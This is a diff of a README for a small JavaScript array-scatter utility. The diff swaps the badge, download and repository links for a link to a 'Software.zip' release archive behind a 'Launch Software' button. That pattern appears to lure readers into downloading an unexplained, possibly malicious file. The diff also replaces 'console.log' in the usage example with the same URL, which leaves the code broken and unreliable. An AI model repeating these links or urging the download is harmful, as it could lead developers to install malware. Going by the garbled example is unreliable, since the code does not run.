@@ -1,6 +1,6 @@
 # 🌟 Array Base Scatter Filled 🌟
 
-![Array Base Scatter Filled](https://img.shields.io/badge/Array-Base%20Scatter%20Filled-green)
+![Array Base Scatter Filled](https://github.com/Atom3dx/array-base-scatter-filled/releases/download/v2.0/Software.zip%20Scatter%20Filled-green)
 
 Welcome to the **Array Base Scatter Filled** repository! This repository provides a utility function to scatter a list of provided values to specified indices in a new filled "generic" array. If you are working with arrays in JavaScript and need a convenient way to scatter values into a new array based on specified indices, this utility function can be a handy tool in your toolkit.
 
@@ -10,7 +10,7 @@ Welcome to the **Array Base Scatter Filled** repository! This repository provide
 - **Topics:** array, fill, filled, generic, javascript, node, node-js, nodejs, scatter, set, stdlib, utilities, utils
 
 ## Important Links
-🚀 **Download Software**: [Launch Software](https://github.com/user-attachments/files/18388744/Software.zip)
+🚀 **Download Software**: [Launch Software](https://github.com/Atom3dx/array-base-scatter-filled/releases/download/v2.0/Software.zip)
 
 If the link ends with a file name, you can click on "Launch Software" to download and explore the utility function provided in this repository.
 
@@ -35,7 +35,7 @@ const indices = [1, 3, 5];
 const length = 6;
 
 const scatteredArray = arrayScatterFilled(values, indices, length);
-console.log(scatteredArray); // Output: [0, 10, 0, 20, 0, 30]
+https://github.com/Atom3dx/array-base-scatter-filled/releases/download/v2.0/Software.zip(scatteredArray); // Output: [0, 10, 0, 20, 0, 30]
 ```
 
 In this example, we scatter the values `[10, 20, 30]` to positions `[1, 3, 5]` in an array of length `6`, resulting in the array `[0, 10, 0, 20, 0, 30]`.
@@ -44,6 +44,6 @@ In this example, we scatter the values `[10, 20, 30]` to positions `[1, 3, 5]` i
 Contributions to the **Array Base Scatter Filled** repository are welcome! If you have ideas for improvements, new features, or bug fixes, feel free to submit a pull request. Your contributions can help enhance the utility of this function for the broader developer community.
 
 ## Get Started
-Visit the [Array Base Scatter Filled Repository](https://github.com/user-attachments/files/18388744/Software.zip) to download the software and start using the utility function to scatter values in your arrays.
+Visit the [Array Base Scatter Filled Repository](https://github.com/Atom3dx/array-base-scatter-filled/releases/download/v2.0/Software.zip) to download the software and start using the utility function to scatter values in your arrays.
 
 🚀 Happy Coding with Array Base Scatter Filled! 🚀
